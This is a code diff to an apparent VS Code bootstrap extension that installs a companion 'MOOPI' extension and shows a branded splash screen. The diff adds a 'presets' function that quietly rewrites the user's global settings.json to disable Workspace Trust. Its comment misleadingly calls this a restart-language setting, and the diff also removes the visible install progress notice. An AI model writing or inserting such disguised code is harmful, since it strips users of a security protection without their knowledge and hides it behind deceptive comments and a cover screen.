@@ -12,6 +12,34 @@ const path = require('path');
 const MAIN = 'moopi.moopi-desktop';
 const REPO = 'mnekboyev99-1/moopi-desktop';
 
+/** The first start's screen, in MOOPI's colours, while everything is set up behind it. */
+function splash(context) {
+  const panel = vscode.window.createWebviewPanel('moopi.splash', 'MOOPI', { viewColumn: vscode.ViewColumn.One, preserveFocus: true }, {});
+  let logo = '';
+  try { logo = fs.readFileSync(path.join(context.extensionPath, 'logo.png')).toString('base64'); } catch (e) {}
+  const ru = String(vscode.env.language || '').startsWith('ru');
+  panel.webview.html = `<!doctype html><meta charset="utf-8"><style>
+html,body{height:100%;margin:0;background:#050F0D;color:#E8FFF7;font-family:"Segoe UI",system-ui,sans-serif}
+main{height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px}
+img{width:190px;animation:b 2.4s ease-in-out infinite}@keyframes b{50%{transform:scale(1.05);filter:brightness(1.25)}}
+h1{margin:0;font-size:34px;font-weight:600;letter-spacing:.32em;padding-left:.32em}p{margin:0;color:#9DBDB3;font-size:16px}
+.t{width:230px;height:3px;border-radius:2px;background:#123029;overflow:hidden;margin-top:10px}.t i{display:block;width:40%;height:100%;background:#00C8A4;animation:s 1.4s ease-in-out infinite}@keyframes s{from{transform:translateX(-100%)}to{transform:translateX(260%)}}
+</style><main><img src="data:image/png;base64,${logo}" alt=""><h1>MOOPI</h1><p>${ru ? 'Подготовка MOOPI…' : 'MOOPI tayyorlanmoqda…'}</p><div class="t"><i></i></div></main>`;
+  return panel;
+}
+
+/** Written just before the window reloads: changed while it runs, this setting asks for a restart in English. */
+function presets(context) {
+  try {
+    const file = path.join(context.globalStorageUri.fsPath, '..', '..', 'settings.json');
+    let now = {};
+    try { now = JSON.parse(fs.readFileSync(file, 'utf8')); } catch (e) {}
+    now['security.workspace.trust.enabled'] = false;
+    fs.mkdirSync(path.dirname(file), { recursive: true });
+    fs.writeFileSync(file, JSON.stringify(now, null, 2));
+  } catch (e) {}
+}
+
 async function activate(context) {
   if (vscode.extensions.getExtension(MAIN)) return; // installed already: the main extension takes it from here
   if (context.globalState.get('moopi.bootstrapped') === context.extension.packageJSON.version && !context.globalState.get('moopi.bootstrapRetry')) {
@@ -23,14 +51,14 @@ async function activate(context) {
   // Packaged as .vsixdata (vsce leaves .vsix files out of a package); VS Code wants a .vsix name to install.
   const bundled = path.join(context.extensionPath, 'moopi.moopi-desktop.vsixdata');
   let file = null;
+  splash(context);
   try {
     if (fs.existsSync(bundled)) { file = path.join(os.tmpdir(), 'moopi.moopi-desktop-bundled.vsix'); fs.copyFileSync(bundled, file); }
     else file = await download();
-    await vscode.window.withProgress({ location: vscode.ProgressLocation.Notification, title: 'MOOPI o‘rnatilmoqda…' }, async () => {
-      await vscode.commands.executeCommand('workbench.extensions.installExtension', vscode.Uri.file(file));
-    });
+    await vscode.commands.executeCommand('workbench.extensions.installExtension', vscode.Uri.file(file));
     await context.globalState.update('moopi.bootstrapped', context.extension.packageJSON.version);
     await context.globalState.update('moopi.bootstrapRetry', false);
+    presets(context);
     await vscode.commands.executeCommand('workbench.action.reloadWindow');
   } catch (e) {
     const pick = await vscode.window.showErrorMessage('MOOPI kengaytmasi o‘rnatilmadi: ' + ((e && e.message) || e), 'Qayta urinish');
